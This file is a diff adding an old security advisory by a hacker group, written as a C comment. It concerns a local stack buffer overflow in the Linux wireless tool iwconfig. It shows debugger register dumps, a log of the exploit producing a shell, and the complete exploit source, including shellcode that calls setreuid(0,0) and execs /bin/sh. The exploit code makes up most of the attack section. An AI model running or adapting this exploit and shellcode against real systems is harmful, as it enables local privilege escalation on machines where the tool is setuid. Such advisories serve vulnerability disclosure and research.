@@ -1,0 +1,158 @@
+/*
+--------------------------------------------------------
+[N]eo [S]ecurity [T]eam [NST]® - Advisory #04 - 23/01/05
+--------------------------------------------------------
+Program:  iwconfig
+Homepage:  http://www.slackware.com
+Vulnerable Versions: iwconfig  Version 26
+                     Compatible with Wireless Extension v16 or earlier,
+                     Currently compiled with Wireless Extension v16.
+                     Kernel    Currently compiled with Wireless Extension v16.
+Risk: Medium!!
+Impact: Local Stack Buffer Overflow
+---------------------------------------------------------
+
+- Description
+---------------------------------------------------------
+
+	Wireless Tools
+
+		Jean II - HPLB 97->99 - HPL 99->01
+
+ Main code for "iwconfig". This is the generic tool for most
+ manipulations...
+ You need to link this code against "iwlib.c" and "-lm".
+
+ This file is released under the GPL license.
+     Copyright (c) 1997-2002 Jean Tourrilhes <jt@hpl.hp.com>
+
+- Tested
+---------------------------------------------------------
+Slackware 10.0
+
+- Explotation
+---------------------------------------------------------
+[+] Status at 85 bytes:
+
+eip            0x400a7fe0       0x400a7fe0
+
+Bruteforcing!!!!
+
+[+] Status at 96 bytes:
+
+esp            0xbffff390       0xbffff390
+ebp            0x41414141       0x41414141
+esi            0x41414190       1094795664
+edi            0x41414141       1094795585
+eip            0x41414141       0x41414141
+
+h4ck@NST:~$ ./x /sbin/iwconfig
+
+[+] 'iwconfig' >> iwxpl.c Local Stack Buffer Overflow (Proof of Concept)
+[+] by HaCkZaTaN <hck_zatan@hotmail.com>
+[+] [N]eo [S]ecurity [T]eam [NST]® - http://neosecurityteam.net/
+[+] Ret: = 0xbfffffbe
+[+] Shellcode : 46
+[+] Waiting............
+sh-3.00$ id
+uid=1000(h4ck) gid=100(users) groups=100(users)
+
+It doesn't give us uid=0 'cuz iwconfig is not set uid=0
+Sorry xD
+
+- Exploit
+---------------------------------------------------------
+/*
+  Name: 'iwconfig' >> iwxpl.c
+  Copyright: ty [T]eam [NST]® - http://neosecurityteam.net/
+  Author: HaCkZaTaN
+  Date: 23/01/05 17:33
+  Description: Local Stack Buffer Overflow
+*/
+
+#include <stdio.h>
+#include <strings.h>
+#define BUFFER 100 + 4
+
+char shellcode[]=
+/* Shellcode by HaCkZaTaN */
+// setreuid(0,0)
+"\x31\xc0"                   //xor    %eax,%eax
+"\xb0\x46"                   //mov    $0x46,%al ;setreuid is syscall 70
+"\x31\xdb"                   //xor    %ebx,%ebx
+"\x31\xc9"                   //xor    %ecx,%ecx
+"\xcd\x80"                   //int    $0x80
+// execve();
+"\xeb\x16"                   //jmp    80480a2
+"\x5b"                       //pop    %ebx ;get the address of the string
+"\x31\xc0"                   //xor    %eax,%eax
+"\x88\x43\x07"               //mov    %al,0x7(%ebx)
+"\x89\x5b\x08"               //mov    %ebx,0x8(%ebx)
+"\x89\x43\x0c"               //mov    %eax,0xc(%ebx)
+"\xb0\x0b"                   //mov    $0xb,%al ;execve is syscall 11
+"\x8d\x4b\x08"               //lea    0x8(%ebx),%ecx
+"\x8d\x53\x0c"               //lea    0xc(%ebx),%edx
+"\xcd\x80"                   //int    $0x80 ;call the kernel
+"\xe8\xe5\xff\xff\xff"       //call   804808c
+"/bin/sh";                   //.string "/bin/sh"
+
+int main(int argc, char *argv[])
+{
+	char *env[3] = {shellcode, NULL};
+	char buf[BUFFER], *path;
+	int *buffer = (int *) (buf);
+	int i, ret;
+
+	if(argc != 2) {
+		printf(" Use: %s <path>\n", argv[0]);
+		exit(0);
+	}
+
+	path = argv[1];
+
+	ret = 0xbffffffa - strlen(shellcode) - strlen(path);
+
+	for(i=0; i<=BUFFER; i+=4)
+	*buffer++ = ret;
+
+	printf("\n[+] 'iwconfig' >> iwxpl.c Local Stack Buffer Overflow (Proof of Concept)\n");
+	printf("[+] by HaCkZaTaN <hck_zatan@hotmail.com>\n");
+	printf("[+] [N]eo [S]ecurity [T]eam [NST]® - http://neosecurityteam.net/\n");
+	printf("[+] Ret: = %.8p\n", ret);
+        printf("[+] Shellcode : %d\n",strlen(shellcode));
+        printf("[+] Waiting............\n");
+
+	execle(path, "iwconfig", buf, NULL, env);
+}
+
+
+- Solutions
+--------------------------------------------------------
+Not Yet or i dont Know xD
+
+- References
+--------------------------------------------------------
+http://neosecurityteam.net/Advisories/Advisory-04.txt
+
+
+- Credits
+-------------------------------------------------
+Discovered by HaCkZaTaN <hck_zatan@hotmail.com>
+
+[N]eo [S]ecurity [T]eam [NST]® - http://neosecurityteam.net/
+
+Got Questions? http://neosecurityteam.net/foros/
+
+- Greets
+--------------------------------------------------------
+           Paisterist
+           T0wn3r
+	   Heap
+           Nitrous
+           CrashCool
+           eL_mEsIaS
+           Makoki
+
+           And my Colombian people
+
+*/
